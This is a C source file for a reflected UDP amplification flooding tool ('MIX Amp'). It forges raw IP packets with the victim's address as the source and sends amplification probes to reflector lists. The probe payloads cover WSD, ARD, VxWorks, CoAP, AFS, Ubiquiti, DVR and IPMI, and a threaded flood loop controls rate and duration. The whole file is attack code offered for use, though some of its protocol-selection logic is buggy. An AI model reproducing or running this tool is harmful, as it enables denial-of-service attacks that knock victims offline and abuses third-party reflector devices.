/***********************************************************************************************************
*
* @Project: MIX Amp
* @Author: Machiavel
* @Features: Sending UDP-based amplification attacks randomly. CLDAP, NTP, WSD, ARD.
*
***********************************************************************************************************/
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
volatile int SPORT;
static uint32_t Q[4096], c = 362436;

//int ports[] = {80,443,1701,1293,500,4500,22,25,53,6881,1194,16276}; 

static const char wsd[] =
    "<:>"; // Well formed:
           // <Envelope><Header><:>a</:></Header><Body><:/></Body></Envelope>
           // Minified well-formed: <Envelope><Body><Probe></Probe></Body></Envelope>
static const char ard[] = "\x00\x14\x00\x00";
static const char vxworks[] =
    "\x1a\x09\xfa\xba\x00\x00\x00\x00\x00\x00\x00\x02\x55\x55\x55\x55\x00\x00"
    "\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\xff\xff\x55\x12\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00"
    "\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00";
static const char coap[] = "\x40\x01\x01\x01\xbb\x2e\x77\x65\x6c\x6c\x2d\x6b"
                              "\x6e\x6f\x77\x6e\x04\x63\x6f\x72\x65";
static const char afs[] =
    "\x00\x00\x03\xe7\x00\x00\x00\x00\x00\x00\x00\x65\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x0d\x05\x00\x00\x00\x00\x00\x00\x00";
static const char ubiquiti[] = "\x01\x00\x00\x00";
static const char dvr[] = "\x44\x48\x49\x50";
static const char ipmi[] = "\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5";

static unsigned int wsdpayload = sizeof(wsd) - 1;
static unsigned int ardpayload = sizeof(ard) - 1;
static unsigned int vxworkspayload = sizeof(vxworks) - 1;
static unsigned int coappayload = sizeof(coap) - 1;
static unsigned int afspayload = sizeof(afs) - 1;
static unsigned int ubiquitipayload = sizeof(ubiquiti) - 1;
static unsigned int dvrpayload = sizeof(dvr) - 1;
static unsigned int ipmipayload = sizeof(ipmi) - 1;

struct list
{
	struct sockaddr_in data;
	struct list *next;
	struct list *prev;
};
struct list *head;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
void init_rand(uint32_t x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
	Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	
	if(x < c)
	{
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int nwords)
{
	unsigned long sum = 0;
	for (sum = 0; nwords > 0; nwords--)
	sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}
char * mixAMP_protocol(){
	while(1){
		char *protocol[8];
		protocol[0] = "wsd.list";
    	protocol[1] = "ard.list";
		protocol[2] = "vxworks.list";
		protocol[3] = "coap.list";
		protocol[4] = "afs.list";
		protocol[5] = "ubiquiti.list";
		protocol[6] = "dvr.list";
		protocol[7] = "ipmi.list";
		return protocol[rand()%8+0];
	}
}
void *mixAMP_setup(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin = td->sin;
	struct  list *list_node = td->list_node;
	
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
	fprintf(stderr, "Could not open raw socket.\n");
	exit(-1);
	}
	init_rand(time(NULL));
	memset(datagram, 0, MAX_PACKET_SIZE);
	char ip[17];
  snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
  iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htonl(rand()%65535);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = inet_addr(ip);
	udph->check = 0;
	iph->saddr = sin.sin_addr.s_addr;
	iph->daddr = list_node->data.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	if(mixAMP_protocol() == "wsd.list"){
		memcpy((void *)udph + sizeof(struct udphdr), wsd, wsdpayload);
        udph->len=htons(sizeof(struct udphdr) + wsdpayload);
		udph->source = htons(SPORT);
        udph->dest = htons(3702);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + wsdpayload;
	}
	if(mixAMP_protocol() == "ard.list"){
		memcpy((void *)udph + sizeof(struct udphdr), ard, ardpayload);
        udph->len=htons(sizeof(struct udphdr) + ardpayload);
		udph->source = htons(SPORT);
        udph->dest = htons(3283);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + ardpayload;
	}
	if(mixAMP_protocol() == "vxworks.list"){
		memcpy((void *)udph + sizeof(struct udphdr), vxworks, vxworkspayload);
        udph->len=htons(sizeof(struct udphdr) + vxworkspayload);
		udph->source = htons(SPORT);
        udph->dest = htons(17185);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + vxworkspayload;
	}
	if(mixAMP_protocol() == "coap.list"){
		memcpy((void *)udph + sizeof(struct udphdr), coap, coappayload);
        udph->len=htons(sizeof(struct udphdr) + coappayload);
		udph->source = htons(SPORT);
        udph->dest = htons(5683);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + coappayload;
	}
	if(mixAMP_protocol() == "afs.list"){
		memcpy((void *)udph + sizeof(struct udphdr), afs, afspayload);
        udph->len=htons(sizeof(struct udphdr) + afspayload);
		udph->source = htons(SPORT);
        udph->dest = htons(7001);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + afspayload;
	}
	if(mixAMP_protocol() == "ubiquiti.list"){
		memcpy((void *)udph + sizeof(struct udphdr), ubiquiti, ubiquitipayload);
        udph->len=htons(sizeof(struct udphdr) + ubiquitipayload);
		udph->source = htons(SPORT);
        udph->dest = htons(10001);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + ubiquitipayload;
	}
	if(mixAMP_protocol() == "dvr.list"){
		memcpy((void *)udph + sizeof(struct udphdr), dvr, dvrpayload);
        udph->len=htons(sizeof(struct udphdr) + dvrpayload);
		udph->source = htons(SPORT);
        udph->dest = htons(37810);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dvrpayload;
	}
	if(mixAMP_protocol() == "ipmi.list"){
		memcpy((void *)udph + sizeof(struct udphdr), ipmi, ipmipayload);
        udph->len=htons(sizeof(struct udphdr) + ipmipayload);
		udph->source = htons(SPORT);
        udph->dest = htons(623);
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + ipmipayload;
	}
	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
	fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
	exit(-1);
	}
	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
		list_node = list_node->next;
		iph->daddr = list_node->data.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}

int main(int argc, char *argv[ ])
{
	if(argc < 6){
	fprintf(stderr, "vpn-bypass - March 18, 2021 - @hazard_security\n");
	fprintf(stdout, "Usage: %s <target IP> <Port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}
	srand(time(NULL));
	int i = 0;
	head = NULL;
	fprintf(stdout, "Setting up sockets...\n");
	int max_len = 128;
	char *buffer = (char *) malloc(max_len);
	buffer = memset(buffer, 0x00, max_len);
	SPORT = atoi(argv[2]);
	int num_threads = atoi(argv[3]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	int multiplier = 20;
	FILE *list_fd = fopen(mixAMP_protocol(),  "r");
	while (fgets(buffer, max_len, list_fd) != NULL) {
		if ((buffer[strlen(buffer) - 1] == '\n') ||
				(buffer[strlen(buffer) - 1] == '\r')) {
			buffer[strlen(buffer) - 1] = 0x00;
			if(head == NULL)
			{
				head = (struct list *)malloc(sizeof(struct list));
				bzero(&head->data, sizeof(head->data));
				head->data.sin_addr.s_addr=inet_addr(buffer);
				head->next = head;
				head->prev = head;
			} else {
				struct list *new_node = (struct list *)malloc(sizeof(struct list));
				memset(new_node, 0x00, sizeof(struct list));
				new_node->data.sin_addr.s_addr=inet_addr(buffer);
				new_node->prev = head;
				new_node->next = head->next;
				head->next = new_node;
			}
			i++;
		} else {
			continue;
		}
	}
	struct list *current = head->next;
	struct sockaddr_in sin;
	pthread_t thread[num_threads];
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	struct thread_data td[num_threads];
	for(i = 0;i<num_threads;i++){
		td[i].thread_id = i;
		td[i].sin= sin;
		td[i].list_node = current;
		pthread_create( &thread[i], NULL, &mixAMP_setup, (void *) &td[i]);
	}
	fprintf(stdout, "Starting flood...\n");
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}
	return 0;
}